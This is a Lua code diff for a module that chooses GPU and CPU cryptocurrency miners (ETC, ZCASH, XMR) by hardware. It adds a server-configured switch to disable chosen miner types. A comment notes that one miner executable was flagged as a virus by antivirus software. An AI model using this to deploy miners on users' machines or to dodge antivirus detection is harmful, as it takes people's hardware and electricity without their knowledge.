@@ -174,6 +174,19 @@ function SupportClientType:CompareGpuPlatform(tabClient, nPlatformId, tabGpuInfo
 	end
 end
 
+function SupportClientType:CheckClentTypeCanRun(ntype)
+	local tClientTypeNoRun  = ServerCfg:GetLocalServerCfgData({"tClientTypeNoRun"})
+	if type(tClientTypeNoRun) ~= "table" then
+		return true
+	end
+	for	nIdx=1, #tClientTypeNoRun do  
+		if ntype == tClientTypeNoRun[nIdx] then
+			return false
+		end
+	end
+	return true
+end
+
 function SupportClientType:GetMachineSupportClient()
 	local tabDisplayCard = self._tabDisplayCard
 	if type(tabDisplayCard) == "table" then
@@ -188,33 +201,39 @@ function SupportClientType:GetMachineSupportClient()
 				if self:IsWow64() then
 					if tabItem["memory_size"] >= 4000000000 
 						and (tabItem["vendor"] == self._VENDOR.AMD or tabItem["vendor"] == self._VENDOR.NVIDIA) 
-						and not self:CheckHasCrashed(self.ClientType.ETC_NA64) then
+						and not self:CheckHasCrashed(self.ClientType.ETC_NA64) 
+						and self:CheckClentTypeCanRun(self.ClientType.ETC_NA64) then
 						tabClient[#tabClient+1] = self.ClientType.ETC_NA64
 					end
 					if tabItem["memory_size"] >= 2000000000 
 						and tabItem["vendor"] == self._VENDOR.NVIDIA 
-						and not self:CheckHasCrashed(self.ClientType.ZCASH_N64) then
+						and not self:CheckHasCrashed(self.ClientType.ZCASH_N64) 
+						and self:CheckClentTypeCanRun(self.ClientType.ZCASH_N64) then
 						tabClient[#tabClient+1] = self.ClientType.ZCASH_N64
 					end
 					if tabItem["memory_size"] >= 2000000000 
 						and tabItem["vendor"] == self._VENDOR.AMD
-						and not self:CheckHasCrashed(self.ClientType.ZCASH_A64) then
+						and not self:CheckHasCrashed(self.ClientType.ZCASH_A64) 
+						and self:CheckClentTypeCanRun(self.ClientType.ZCASH_A64) then
 						--exe过白被报毒，所以暂时不用
 					end
 					if tabItem["memory_size"] >= 1*1024*1024*1024 
 						and tabItem["vendor"] == self._VENDOR.NVIDIA
-						and not self:CheckHasCrashed(self.ClientType.XMR_N64) then
+						and not self:CheckHasCrashed(self.ClientType.XMR_N64) 
+						and self:CheckClentTypeCanRun(self.ClientType.XMR_N64) then
 						tabClient[#tabClient+1] = self.ClientType.XMR_N64
 					end
 					if tabItem["memory_size"] >= 1*1024*1024*1024 
 						and tabItem["vendor"] == self._VENDOR.AMD
-						and not self:CheckHasCrashed(self.ClientType.XMR_A64) then
+						and not self:CheckHasCrashed(self.ClientType.XMR_A64)
+						and self:CheckClentTypeCanRun(self.ClientType.XMR_A64) then 
 						tabClient[#tabClient+1] = self.ClientType.XMR_A64
 					end
 				else
 					if tabItem["memory_size"] >= 1*1024*1024*1024 
 						and tabItem["vendor"] == self._VENDOR.AMD
-						and not self:CheckHasCrashed(self.ClientType.XMR_A32) then						
+						and not self:CheckHasCrashed(self.ClientType.XMR_A32) 
+						and self:CheckClentTypeCanRun(self.ClientType.XMR_A32) then						
 						--tabClient[#tabClient+1] = self.ClientType.XMR_A32
 					end
 				end	
@@ -231,8 +250,9 @@ function SupportClientType:GetMachineSupportClient()
 		--self._tabCpuClient[#self._tabCpuClient+1] = self.ClientType.UT_C64
 	end	
 	--7: CPU      Share4PeerXC.exe  XMR
-	self._tabCpuClient[#self._tabCpuClient+1] = self.ClientType.XMR_C32
-	
+	if self:CheckClentTypeCanRun(self.ClientType.XMR_C32) then
+		self._tabCpuClient[#self._tabCpuClient+1] = self.ClientType.XMR_C32
+	end
 	self:SortClientTable()
 	tFunctionHelper.DumpObj(self._tabGpuClient, "tabGpuClient")
 	tFunctionHelper.DumpObj(self._tabCpuClient, "tabCpuClient")
